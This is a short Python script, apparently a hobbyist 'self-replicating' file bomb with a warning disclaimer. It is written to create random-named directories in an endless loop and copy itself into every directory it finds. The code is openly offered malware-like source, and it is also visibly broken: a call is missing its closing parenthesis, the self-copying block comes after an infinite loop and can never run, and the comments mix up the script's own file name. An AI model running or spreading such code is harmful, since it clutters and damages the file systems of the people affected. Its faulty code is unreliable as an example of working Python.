'''
<DISCLAIMER>
THIS CODE REPLICATES ITSELF AND WILL CREATE NEW DIRECTORIES
PLEASE MIND THAT THIS WOULD FUCK UP YOUR DIRECTORIES, INCLUDING FILES AND FOLDERS
***DO NOT RUN THIS FILE IN ANY IMPORTANT DIRECTORIES***

self-replicating python file - Replicada by archisha69
'''

import os, shutil, time, random, string #imports modules

sep = "\\" if os.name == "nt" else "/" #get path seperator
cwd = os.getcwd() #get current working directory

count = 0 #counter

while True: #warning: this is an infinity loop without breaking
    name = ''.join(random.choice(string.printable) #ramdom string generator
    time.sleep(1) #cooldown, lower the value to make the process faster, higher the value to make the process slower (prevent lags)
    os.mkdir(f"{cwd}{sep}{name}{count}") #created directory name will be random printable characters
    count += 1 #increases count everytime it creates a directory
    
if count == 10: #start self-replicating when count to 10
    all = os.listdir(cwd) #returns a list of all current directories
    for dir in all: #for every directories and files
        if dir == "rep.py": pass #failsafe, skip existed (this file) main.py in current directory, if you already have 1 file named "main.py" in current working directory (cwd), please change the name of this file and change "main.py" in this line to this file's name after changes
        else: #i dont think you can copy main.py to main.py, right? (i mean it technically can)
            time.sleep(1) #cooldown, as same as the previous one
            shutil.copy(f"{cwd}{sep}rep.py", dir) #copies itself to all directories in cwd
